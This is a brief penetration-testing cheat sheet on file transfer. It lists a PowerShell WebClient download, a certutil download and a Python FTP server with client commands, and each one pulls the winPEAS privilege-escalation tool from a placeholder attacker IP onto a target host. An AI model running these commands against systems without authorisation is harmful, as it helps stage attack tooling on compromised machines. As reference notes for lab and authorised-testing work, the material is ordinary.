# File transfer 

## Windows

### Powershell
```powershell
powershell -c "(New-Object System.Net.WebClient).DownloadFile(\"http://<attacker_ip>:8888/winPEASany.exe\", \"winpeas.exe\")" 
```

### Cert
```powershell
certutil -urlcache -split -f "http://<attacker_ip>:8888/winPEASany.exe" winpeas.exe
```

## Linux

### Python FTP
```python
python -m pyftpdlib -p 21  
ftp -A <attacker_ip>   
binary    
get winPEAS.exe   
bye 
```

## Other 
